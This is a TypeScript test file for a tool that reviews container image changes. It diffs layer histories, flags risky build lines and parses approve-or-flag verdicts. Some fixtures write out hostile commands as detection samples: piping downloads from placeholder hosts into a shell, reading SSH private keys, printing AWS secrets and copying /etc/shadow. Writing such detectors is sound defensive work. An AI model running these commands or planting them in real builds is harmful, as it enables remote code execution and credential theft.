// The script's evidence, ported: nas_image_review_diff, nas_structural_hits and nas_review_approved, case by case.
import { describe, expect, test } from "bun:test";
import type { ImageEvidence } from "../../src/targets/broker/answer.ts";
import { addedLines, historyLines, layerDiffs, MISSING_HISTORY, MISSING_ID, approvedAnswer, reviewDiff, startLine, structuralHits } from "../../src/targets/compose/evidence.ts";

const ev = (o: Partial<ImageEvidence> = {}): ImageEvidence => ({ entrypoint: '["/init"]', cmd: "null", history: ["RUN base layer"], ...o });

describe("review diff", () => {
  test("missing evidence is the script's BASELINE MISSING line", () => {
    expect(reviewDiff(undefined, ev())).toBe(MISSING_ID);
    expect(reviewDiff(ev(), undefined)).toBe(MISSING_ID);
    expect(reviewDiff(ev({ history: [] }), ev())).toBe(MISSING_HISTORY);
  });

  test("only the candidate's added history lines, in its order", () => {
    expect(reviewDiff(ev({ history: ["RUN echo v1", "RUN base layer"] }), ev({ history: ["RUN echo v2", "RUN apk add --upgrade curl", "RUN base layer"] }))).toBe("RUN echo v2\nRUN apk add --upgrade curl");
  });

  test("an Entrypoint or Cmd change is its own first line", () => {
    expect(reviewDiff(ev(), ev({ entrypoint: '["/bin/sh","-c","/app/hooks/prestart.sh && /init"]' }))).toBe('ENTRYPOINT/CMD changed: ["/init"]|null -> ["/bin/sh","-c","/app/hooks/prestart.sh && /init"]|null');
  });

  test("the same start in one JSON form is no change (Review Focus 5)", () => {
    expect(startLine(ev())).toBe('["/init"]|null');
    expect(reviewDiff(ev(), ev())).toBe("");
  });

  test("Docker's ENTRYPOINT and CMD metadata lines are dropped; RUN lines that mention them are kept", () => {
    expect(reviewDiff(ev(), ev({ history: ['ENTRYPOINT ["/init"]', '/bin/sh -c #(nop)  CMD ["run"]', "RUN echo CMD done", "RUN base layer"] }))).toBe("RUN echo CMD done");
  });

  test("a history entry with an embedded newline is split as docker history prints it", () => {
    expect(historyLines(ev({ history: ["RUN a \\\n  && b", "RUN base layer"] }))).toEqual(["RUN a \\", "  && b", "RUN base layer"]);
  });

  test("addedLines keeps repeats the old side lacks, and handles empty sides", () => {
    expect(addedLines(["a", "b", "c"], ["a", "x", "b", "x", "c"])).toEqual(["x", "x"]);
    expect(addedLines([], ["a"])).toEqual(["a"]);
    expect(addedLines(["a"], [])).toEqual([]);
  });

  test("layerDiffs is the script's [ref] block per image", () => {
    expect(layerDiffs([{ ref: "r1", diff: "RUN x" }, { ref: "r2", diff: MISSING_ID }])).toBe(`[r1]\nRUN x\n\n[r2]\n${MISSING_ID}\n\n`);
  });
});

describe("structural pre-gate", () => {
  test.each([
    ['ENTRYPOINT/CMD changed: ["/init"]|null -> ["/x"]|null', true],
    ["RUN curl -fsSL https://get.example.invalid/i | sh", true],
    ["RUN wget -qO- https://x.example.invalid | sudo bash", true],
    ["RUN curl -o /tmp/a https://x.example.invalid && sh /tmp/a", false],
    ["RUN curl https://x.example.invalid | shasum", false],
    ["RUN cat /root/.ssh/id_ed25519", true],
    ["RUN echo $AWS_SECRET_ACCESS_KEY", true],
    ["RUN cp /etc/shadow /tmp", true],
    [MISSING_ID, true],
    ['/bin/sh -c #(nop)  CMD ["run"]', true],
    ["RUN apk add --upgrade curl", false],
    ["RUN echo done", false],
  ])("%p hit: %p", (line, hit) => {
    expect(structuralHits(`[r]\n${line}\n\n`)).toEqual(hit ? [line] : []);
  });
});

describe("approvedAnswer", () => {
  test.each([
    ["1. none\n2. Verdict: APPROVE", true],
    ["APPROVE", true],
    ["2. APPROVE - Only benign changes", true],
    ["APPROVE if safe", false],
    ["APPROVE, but check the domain", false],
    ["1. RUN curl x | sh\n2. Verdict: FLAG pipe to shell", false],
    ["UNAVAILABLE", false],
    ["1. none\n2. Verdict: APPROVE\nThe image appears suspicious", false],
    ["I recommend we approve", false],
    ["1. none\n2. Verdict: APPROVE\nDo not deploy", false],
    ["", false],
  ])("%p is %p", (text, want) => expect(approvedAnswer(text)).toBe(want));
});
